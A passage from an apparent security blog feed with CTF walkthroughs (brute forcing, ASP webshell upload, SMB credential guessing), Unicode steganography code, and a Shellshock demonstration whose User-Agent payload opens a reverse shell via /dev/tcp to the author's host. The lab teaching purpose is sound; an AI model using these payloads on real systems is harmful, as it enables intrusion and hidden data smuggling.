<p>We notice that among the many open ports, we seemingly have an IIS web-server running on the target; let&rsquo;s navigate to it, using Firefox, to see what it might be hiding.</p>

    <img src="/CTF2/web-1.png"  alt="web server IIS"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We&rsquo;re met by a login screen. Let&rsquo;s remember the first flag stating that a user named <em>bob might not have chosen a strong password</em>, let&rsquo;s try to brute force it using hydra : <code>hydra -l bob -P /usr/share/metasploit-framework/data/wordlists unix_passwords.txt target1.ine.local http-get /</code>.</p>

    <img src="/CTF2/hydra-1.png"  alt="hydra brute force"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Okay, we found the credentials : <em><strong>bob:password_123321</strong></em>. Logging in, we&rsquo;re met by the default IIS web-server front page.</p>

    <img src="/CTF2/web-2.png"  alt="default IIS front page"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Next step would be to enumerate the directories within the web-server, for that we would use a Metasploit auxiliary scanner, or in this case, since it&rsquo;s easier to provide credentials, we use <em>dirb</em> : <code>dirb http://target1.ine.local/ -u bob:password_123321</code>.</p>

    <img src="/CTF2/dirb-1.png"  alt="dirb scan target 1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We find a WebDav directory, that could be interesting. And indeed, navigating to it reveals the first flag.</p>

    <img src="/CTF2/web-3.png"  alt="webdav directory and flag 1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<h2 id="flag-2">Flag 2</h2>
<h4 id="valuable-files-are-often-on-the-c-drive-explore-it-thoroughly-target1inelocal">Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)</h4>
<p>Since we have access to a WebDav directory, let&rsquo;s see if we could exploit it by uploading and executing a webshell through it. First thing to do is to test the target setup for .asp execution : <code>davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/</code>.</p>

    <img src="/CTF2/davtest.png"  alt="davtest"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We now know that .asp files execute just fine, so let&rsquo;s upload a webshell using cadaver : <code>cadaver http://target1.ine.local/webdav/</code>.</p>

    <img src="/CTF2/cadaver.png"  alt="cadaver"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>This provides us with a webshell, that once accessed, gets us the possibility to execute arbitrary commands :  <code>type c:\flag2.txt</code>.</p>

    <img src="/CTF2/flag-2.png"  alt="second flag"  class="center"  style="border-radius: 8px; width: 100%;"  />


<h2 id="flag-3">Flag 3</h2>
<h4 id="by-attempting-to-guess-smb-user-credentials-you-may-uncover-important-information-that-could-lead-you-to-the-next-flag-target2inelocal">By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)</h4>
<p>As always, let&rsquo;s scan the target and see what kind of services we have running : <code>nmap -sV target2.ine.local -p-</code>.</p>

    <img src="/CTF2/nmap-2.png"  alt="nmap scan second target"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We already knew that we would be dealing with SMB and the scan pretty much confirms it with the open 445 port. Next step is to use the metasploit auxiliary scanner module for SMB : <code>auxiliary/scanner/smb/smb_login</code>.</p>

    <img src="/CTF2/metasploit-1.png"  alt="metasploit one"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Configuring and running the scanner leaves us with 4 credentials, one of which is the <em>Administrator</em> account : <code>administrator:pineapple</code>. Using these credentials we can scan for shares using the module : <code>auxiliary/scanner/smb/smb_enumshares</code>.</p>

    <img src="/CTF2/metasploit-2.png"  alt="metasploit two"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We have 6 shares accessible to the administrator, let&rsquo;s try accessing the default one <em><strong>C$</strong></em> where we&rsquo;ll find the third flag : <code>smbclient //target2.ine.local/C$ -U administrator%pineapple</code></p>

    <img src="/CTF2/smbclient-1.png"  alt="flag 3"  class="center"  style="border-radius: 8px; width: 100%;"  />


<h2 id="flag-4">Flag 4</h2>
<h4 id="the-desktop-directory-might-have-what-youre-looking-for-enumerate-its-contents-target2inelocal">The Desktop directory might have what you&rsquo;re looking for. Enumerate its contents. (target2.ine.local)</h4>
<p>To get this flag, it&rsquo;s as easy as navigating to the Desktop of the Administrator and finding the file containing the flag.</p>

    <img src="/CTF2/smbclient-2.png"  alt="flag 4"  class="center"  style="border-radius: 8px; width: 100%;"  />


<h1 id="conclusion">Conclusion</h1>
<p>Fun as always, this one was a bit harder than the previous one but still very straightforward.</p>
<p>I enjoyed it and i hope you will too.</p>
]]></content>
        </item>
        
        <item>
            <title>DeepDive : Concealing Text Using Unicode</title>
            <link>/posts/hide_emoji/</link>
            <pubDate>Wed, 19 Mar 2025 21:00:47 +0000</pubDate>
            
            <guid>/posts/hide_emoji/</guid>
            <description>&lt;p&gt;I recently stumbled upon an article titled &lt;a href=&#34;https://slamdunksoftware.substack.com/p/hidden-messages-in-emojis-and-hacking&#34;&gt;Hidden Messages in Emojis and Hacking the US Treasury&lt;/a&gt; and it reminded me of a &lt;a href=&#34;https://github.com/Yassine-elhammoumi/Unicode_character_encoding&#34;&gt;piece of code&lt;/a&gt; i wrote back in February 2025 about Unicode character encoding and how we could hide text inside a single character to hide a message inside of it, if we wanted to.
I was able to do that thanks to the Unicode Variation Selectors.&lt;/p&gt;
&lt;h3 id=&#34;unicode-variation-selectors&#34;&gt;Unicode variation selectors&lt;/h3&gt;
&lt;p&gt;Variation selectors are special characters in the Unicode standard that modify the appearance of preceding characters. They are often used in situations where slight variations in character rendering are needed, such as choosing between different glyph styles.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I recently stumbled upon an article titled <a href="https://slamdunksoftware.substack.com/p/hidden-messages-in-emojis-and-hacking">Hidden Messages in Emojis and Hacking the US Treasury</a> and it reminded me of a <a href="https://github.com/Yassine-elhammoumi/Unicode_character_encoding">piece of code</a> i wrote back in February 2025 about Unicode character encoding and how we could hide text inside a single character to hide a message inside of it, if we wanted to.
I was able to do that thanks to the Unicode Variation Selectors.</p>
<h3 id="unicode-variation-selectors">Unicode variation selectors</h3>
<p>Variation selectors are special characters in the Unicode standard that modify the appearance of preceding characters. They are often used in situations where slight variations in character rendering are needed, such as choosing between different glyph styles.</p>
<p>For example in the case of emojis : (<a href="https://en.wikipedia.org/wiki/Hearts_in_Unicode">source</a>)</p>
<table>
  <thead>
      <tr>
          <th>Glyph</th>
          <th>Description</th>
          <th>Unicode</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>☑︎</td>
          <td>U+2611 BALLOT BOX WITH CHECK in explicit text style</td>
          <td><code>U+2611 U+FE0E</code> (VS15)</td>
      </tr>
      <tr>
          <td>☑️</td>
          <td>U+2611 BALLOT BOX WITH CHECK in explicit emoji style</td>
          <td><code>U+2611 U+FE0F</code> (VS16)</td>
      </tr>
      <tr>
          <td>✉︎</td>
          <td>U+2709 ENVELOPE in explicit text style</td>
          <td><code>U+2709 U+FE0E</code> (VS15)</td>
      </tr>
      <tr>
          <td>✉️</td>
          <td>U+2709 ENVELOPE in explicit emoji style</td>
          <td><code>U+2709 U+FE0F</code> (VS16)</td>
      </tr>
      <tr>
          <td>✔︎</td>
          <td>U+2714 HEAVY CHECK MARK in explicit text style</td>
          <td><code>U+2714 U+FE0E</code> (VS15)</td>
      </tr>
      <tr>
          <td>✔️</td>
          <td>U+2714 HEAVY CHECK MARK in explicit emoji style</td>
          <td><code>U+2714 U+FE0F</code> (VS16)</td>
      </tr>
  </tbody>
</table>
<p>We see that they are pretty much the same but with different formating thanks to the variation selectors.</p>
<p>We use these variation selectors in other contexts too, such as:</p>
<ul>
<li><strong>Mathematical Symbols</strong></li>
<li><strong>Chinese, Japanese, and Korean Characters</strong></li>
</ul>
<h3 id="how-can-we-use-this-">How can we use this ?</h3>
<p>So I made a demonstration to showcase how we could exploit this :</p>

    <img src="/screens/unicode/screen.gif"  alt="code demo"  class="center"  style="border-radius: 8px; width: 100%"  />


<h4 id="how-does-this-work-">How does this work ?</h4>
<p>The concept is straightforward:</p>
<ul>
<li>Convert the data you want to hide into bytes.</li>
<li>Map each byte to a corresponding variation selector.</li>
<li>Attach these variation selectors to a base character.</li>
<li>On the other side, when reading the text, you can extract the hidden bytes from the variation selectors, convert them back to their original form, and reveal the concealed data.</li>
</ul>
<p>Let&rsquo;s go through the code and try to understand it.</p>
<p><em>encode.py</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">byte_to_variation_selector</span>(byte: int) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> byte <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">0xFE00</span> <span style="color:#f92672">+</span> byte)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">0xE0100</span> <span style="color:#f92672">+</span> (byte <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(base: str, byte_list: list[int]) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> base
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> byte_list:
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">+=</span> byte_to_variation_selector(byte)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    conf_text <span style="color:#f92672">=</span> list(input(<span style="color:#e6db74">&#34;Enter the text you want to hide: &#34;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    char_uni <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter the character you want to hide the text in: &#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    encoded <span style="color:#f92672">=</span> encode(char_uni, conf_text)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Encoded length:&#34;</span>, len(encoded))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Encoded: </span><span style="color:#e6db74">{</span>encoded<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>The <code>byte_to_variation_selector</code> function maps each byte to a Unicode variation selector.</p>
<hr>
<p>So basically, there are two sets of variation selectors we can exploit :</p>
<ul>
<li><strong>0xFE00</strong> to <strong>0xFE0F</strong> : These are Unicode variation selectors for subtle changes (for example, stylistic differences in emoji or text).</li>
<li><strong>0xE0100</strong> to <strong>0xE01EF</strong> : These are extended variation selectors used for additional rendering options.</li>
</ul>
<hr>
<p>Then we just append the variations (that we selected with <code>byte_to_variation_selector</code>) to the base character.</p>
<p><em>decode.py</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">variation_selector_to_byte</span>(variation_selector: str) <span style="color:#f92672">-&gt;</span> int <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    codepoint <span style="color:#f92672">=</span> ord(variation_selector)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0xFE00</span> <span style="color:#f92672">&lt;=</span> codepoint <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xFE0F</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> codepoint <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xFE00</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0xE0100</span> <span style="color:#f92672">&lt;=</span> codepoint <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xE01EF</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> codepoint <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xE0100</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode</span>(variation_selectors: str) <span style="color:#f92672">-&gt;</span> list[int]:
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Skip the base character</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> variation_selectors[<span style="color:#ae81ff">1</span>:]:
</span></span><span style="display:flex;"><span>        byte <span style="color:#f92672">=</span> variation_selector_to_byte(ch)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> byte <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">.</span>append(byte)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Instead of breaking, just ignore non-variation selectors.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    encoded <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter the encoded text: &#34;</span>)
</span></span><span style="display:flex;"><span>    decoded_bytes <span style="color:#f92672">=</span> decode(encoded)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        decoded_text <span style="color:#f92672">=</span> bytes(decoded_bytes)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        decoded_text <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Decoding error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Decoded: </span><span style="color:#e6db74">{</span>decoded_text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Decoding is basically the same process but in reverse. And this is how we can hide text in plain sight.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I could see this used in a CTF environment and i think it will carry out a lot of head scratches.
I had a lot of fun discovering all of this and making it work and I hope you too will enjoy tinkering with this feature.</p>
]]></content>
        </item>
        
        <item>
            <title>Shellshock : Explanation &#43; Demonstration (CVE-2014-6271)</title>
            <link>/posts/shellshock/</link>
            <pubDate>Mon, 17 Mar 2025 23:59:52 +0000</pubDate>
            
            <guid>/posts/shellshock/</guid>
            <description>&lt;h2 id=&#34;what-is-shellshock-cve-2014-6271&#34;&gt;What is Shellshock (CVE-2014-6271)?&lt;/h2&gt;
&lt;p&gt;Basically, Shellshock is a &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2014-6271&#34;&gt;critical&lt;/a&gt; vulnerability in Bash (versions 1.03 through 4.3) that allows attackers to perform arbitrary commands executions due to a flaw in Bash&amp;rsquo;s handling of environment variables.&lt;/p&gt;
&lt;h3 id=&#34;environment-variables-&#34;&gt;Environment variables ?&lt;/h3&gt;
&lt;p&gt;Environment variables are a simple way to pass about the current operating environment to the program being executed. You can define one simply by typing :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;variable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And you can use it as you would use a variable in a programming language.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="what-is-shellshock-cve-2014-6271">What is Shellshock (CVE-2014-6271)?</h2>
<p>Basically, Shellshock is a <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">critical</a> vulnerability in Bash (versions 1.03 through 4.3) that allows attackers to perform arbitrary commands executions due to a flaw in Bash&rsquo;s handling of environment variables.</p>
<h3 id="environment-variables-">Environment variables ?</h3>
<p>Environment variables are a simple way to pass about the current operating environment to the program being executed. You can define one simply by typing :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>variable<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>
</span></span></code></pre></div><p>And you can use it as you would use a variable in a programming language.</p>

    <img src="/screens/shellshock/bash-1.png"  alt="bash-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>
<p><em>note : There&rsquo;s more depth to this, if you want to read more about it, I recommend this <a href="https://linuxize.com/post/how-to-set-and-list-environment-variables-in-linux/">article</a>.</em></p>
<hr>
<p>The root of the problem comes from Bash executing arbitrary commands coming after function declarations. Bash continued to process and execute additional code that followed a function definition within the environment variable. This behavior was unexpected and dangerous. An attacker could exploit this by injecting malicious commands into the environment variables passed to Bash through CGI.</p>
<h3 id="common-gateway-interface-cgi">Common Gateway Interface (CGI)</h3>
<p>CGI is a protocol used by a web server to execute external commands/scripts and pass the results back to the client (a web browser).</p>
<p>This makes it easy to have interactions between client and server to have dynamic web pages or to be able to easily process data.</p>

    <img src="/screens/shellshock/env.png"  alt="environment-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>
<p>Note : Learn more about CGI <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">here</a>.</p>
<hr>
<h2 id="demonstration">Demonstration</h2>
<p>I found a vulnerable machine on <a href="https://www.vulnhub.com/">VULNHUB</a> and set it up on VMware. You can download it <a href="https://github.com/Yassine-elhammoumi/Yassine-elhammoumi.github.io/raw/refs/heads/main/public/screens/shellshock/cve-2014-6271.iso">here</a>.</p>

    <img src="/screens/shellshock/vmware-1.png"  alt="vmware-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>I got the ip address from the machine using <em>ifconfig</em> (<strong>172.16.116.129</strong>).</p>

    <img src="/screens/shellshock/vmware-2.png"  alt="vmware-2"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>I started up burp suite and navigated to the web server on (<strong>172.16.116.129</strong>, we find a simple web page.</p>
<hr>
<p>Note : Don&rsquo;t forget to set up <a href="https://aatharvauti.github.io/burpsuite/x.%20Foxy%20Proxy.html">foxy proxy</a></p>
<hr>

    <img src="/screens/shellshock/webpage.png"  alt="webpage-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/screens/shellshock/burp-1.png"  alt="burp-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>I sent the request to the repeater and changed the User-Agent into :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :; <span style="color:#f92672">}</span>; echo; echo; /bin/bash -c <span style="color:#e6db74">&#39;bash -i&gt;&amp;/dev/tcp/172.16.116.1/1234  0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><hr>
<h3 id="breakdown-of-the-command">Breakdown of the command</h3>
<ul>
<li><strong>()</strong> : Nameless function declaration.</li>
<li><strong>{ :; }</strong> : Empty function body (: is built-in shell command that does nothing (a no-op)).</li>
<li><strong>/bin/bash -c</strong> : Tells the system to execute a command with Bash.</li>
<li><strong>bash -i</strong> : To run bash in interactive mode (-i).</li>
<li><strong>&gt;&amp;/dev/tcp/172.16.116.1/1234</strong> : It attempts to open a connection to the IP address 172.16.116.1 on port 1234 (/dev/tcp/172.16.116.1/1234) and redirects the output of the Bash shell (&gt;&amp;).</li>
</ul>
<hr>

    <img src="/screens/shellshock/burp-2.png"  alt="burp-2"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p><strong>172.16.116.1</strong> being my ip address for the VMware network interface.</p>
<p>I then sat up a listener before sending the request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1234</span>
</span></span></code></pre></div><p>And we&rsquo;re done, we have access to the system through Netcat.</p>

    <img src="/screens/shellshock/nc.png"  alt="netcat"  class="center"  style="border-radius: 8px; width: 100%;"  />


<h2 id="conclusion">Conclusion</h2>
<p>That&rsquo;s it, this is an old vulnerability, but I wanted to showcase it and have a simple proof of concept for people to try.</p>
]]></content>
        </item>
        
        <item>
            <title>walkthrough : Assessment Methodologies: Vulnerability Assessment CTF 1 (INE - eJPT)</title>
            <link>/posts/vulnerability_assessment_ctf_1/</link>
            <pubDate>Sun, 16 Mar 2025 20:52:36 +0000</pubDate>
            
            <guid>/posts/vulnerability_assessment_ctf_1/</guid>
            <description>&lt;p&gt;Today we&amp;rsquo;re going to write about my attempt at solving the &lt;em&gt;&amp;ldquo;Assessment Methodologies: Vulnerability Assessment CTF 1&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Before trying to capture any flags, I started by doing a quick nmap scan on the local network to identify the target.&lt;/p&gt;

    &lt;img src=&#34;/screens/nmap-1.png&#34;  alt=&#34;First nmap scan&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px; width: 70%;&#34;  /&gt;


&lt;p&gt;We can see that the ports &lt;strong&gt;80&lt;/strong&gt; and &lt;strong&gt;3306&lt;/strong&gt; are open on the host&amp;rsquo;s IP &lt;strong&gt;192.194.77.3&lt;/strong&gt; so it must be our target (the &lt;em&gt;target.ine.local&lt;/em&gt; helps too).&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Today we&rsquo;re going to write about my attempt at solving the <em>&ldquo;Assessment Methodologies: Vulnerability Assessment CTF 1&rdquo;</em></p>
<p>Before trying to capture any flags, I started by doing a quick nmap scan on the local network to identify the target.</p>

    <img src="/screens/nmap-1.png"  alt="First nmap scan"  class="center"  style="border-radius: 8px; width: 70%;"  />


<p>We can see that the ports <strong>80</strong> and <strong>3306</strong> are open on the host&rsquo;s IP <strong>192.194.77.3</strong> so it must be our target (the <em>target.ine.local</em> helps too).</p>
<p>I then opened the browser to look at the web server (since port 80 is open) and I found an OWASP app.</p>

    <img src="/screens/owasp-1.png"  alt="OWASP app"  class="center"  style="border-radius: 8px; width: 100%;"  />


<h2 id="flag-1">Flag 1:</h2>
<h3 id="explore-hidden-directories-for-version-control-artifacts-that-might-reveal-valuable-information">Explore hidden directories for version control artifacts that might reveal valuable information.</h3>
<p>This instantly makes me think of a <em>.git</em> directory that must&rsquo;ve been left on the server, but to make sure I launch a metasploit scanner ; <strong>scanner/http/git_scanner</strong>.</p>

    <img src="/screens/scan-1.png"  alt="git-scanner"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We, indeed, have a left-out .git directory at <strong>http://192.194.77.3/.git</strong>; Let&rsquo;s go exploring.</p>

    <img src="/screens/git-1.png"  alt="git-flag"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We found the first flag there, let&rsquo;s keep digging.</p>
<h2 id="flag-2">Flag 2</h2>
<h3 id="the-data-storage-has-some-loose-security-measures-can-you-find-the-flag-hidden-within-it">The data storage has some loose security measures. Can you find the flag hidden within it?</h3>
<p>First thing I thought about was the MySQL server on port <strong>3306</strong>, so I set out to find the login for it, which, in hindsight, was a bit hasty of me.</p>

    <img src="/screens/mysql_login.png"  alt="mysql_login"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We find that the version of MySQL is unsupported&hellip; I try to do a more advanced service scan using nmap to find out more information.</p>

    <img src="/screens/nmap-2.png"  alt="second nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Too many connections&hellip; I decide then to do a more comprehensive enumeration of the web server to find any relevant directories.</p>

    <img src="/screens/nmap-3.png"  alt="third nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>BANG ON! This is a treasure site, we found some very juicy information :</p>
<ul>
<li>.git directory that would&rsquo;ve been revealed way more easily.</li>
<li><em><strong>/phpmyadmin/ which is our target for this flag</strong></em></li>
<li>/password/ (do I need to explain myself?)</li>
<li>/config/</li>
<li>/phpinfo.php</li>
</ul>
<p>Anyway, let&rsquo;s start exploring by navigating to the phpmyadmin dashboard.</p>

    <img src="/screens/phpmyadmin-1.png"  alt="phpmyadmin"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Let&rsquo;s explore the database.</p>

    <img src="/screens/phpmyadmin-2.png"  alt="phpmyadmin 2"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>There&rsquo;s one called <em>&ldquo;secret_info&rdquo;</em> where we find our second flag.</p>
<h2 id="flag-3--4">Flag 3 &amp; 4</h2>
<h3 id="a-php-file-that-displays-server-information-might-be-worth-examining-what-could-be-hidden-in-plain-sight">A PHP file that displays server information might be worth examining. What could be hidden in plain sight?</h3>
<p>The last two flags are easily found thanks to the http_enum nmap scan, they were in the /passwords/ and /phpinfo.php.</p>

    <img src="/screens/php.png"  alt="php-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/screens/passwords.png"  alt="passwords-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>
<h1 id="nessus">Nessus</h1>
<p>This is the part where I remember that this was supposed to be a Nessus practice, so I pull up the app to try and find the same results by launching the first scan, which was a basic network scan.</p>

    <img src="/screens/nessus-1.png"  alt="nessus-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/screens/nessus-2.png"  alt="nessus-2"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Okay, the scan gets us the open ports and the services but not much else, so I decide to do a Web Application scan, which gets me all the needed info to complete the CTF.</p>

    <img src="/screens/nessus-git.png"  alt="nessus-git"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/screens/nessus-admin.png"  alt="nessus-admin"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/screens/nessus-php-2.png"  alt="nessus-php-2"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/screens/nessus-pass.png"  alt="nessus password"  class="center"  style="border-radius: 8px; width: 100%;"  />


<h1 id="conclusion">Conclusion</h1>
<p>To be totally honest, I found this CTF way too easy compared to some of the previous ones. But it was fun, I enjoyed it.</p>
]]></content>
        </item>
        
        <item>
            <title>Effortless Package Management: A Comprehensive Look at APT</title>
            <link>/posts/apt/</link>
            <pubDate>Fri, 14 Mar 2025 00:02:13 +0000</pubDate>
            
            <guid>/posts/apt/</guid>
            <description>&lt;p&gt;You must’ve stumbled upon this command while reading online tutorials on how to install software, and we’ve all copy-pasted the command without a second thought because it works well most of the time and is an easy, convenient way to install/update software.
Today I’ll dive deeper on the intricacies of this command.&lt;/p&gt;
&lt;h2 id=&#34;what-is-apt-package-manager&#34;&gt;What is APT Package Manager&lt;/h2&gt;
&lt;p&gt;The &lt;a href=&#34;https://en.wikipedia.org/wiki/APT_%28software%29&#34;&gt;Advanced Package Tool&lt;/a&gt; (APT) is a free utility that lets user install, update and manage software packages. These packages are bundled in repositories, which are external sources containing software that users can install. APT simplifies the interaction with these repositories and automates the management of dependencies.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>You must’ve stumbled upon this command while reading online tutorials on how to install software, and we’ve all copy-pasted the command without a second thought because it works well most of the time and is an easy, convenient way to install/update software.
Today I’ll dive deeper on the intricacies of this command.</p>
<h2 id="what-is-apt-package-manager">What is APT Package Manager</h2>
<p>The <a href="https://en.wikipedia.org/wiki/APT_%28software%29">Advanced Package Tool</a> (APT) is a free utility that lets user install, update and manage software packages. These packages are bundled in repositories, which are external sources containing software that users can install. APT simplifies the interaction with these repositories and automates the management of dependencies.</p>
<p>APT came as a way to resolve dependency issues and is often hailed as one of Debian&rsquo;s best features.</p>
<h3 id="apt-or-apt-get-whats-the-difference">apt or apt-get? What&rsquo;s the difference?</h3>
<h4 id="a-brief-history">A brief history</h4>
<ul>
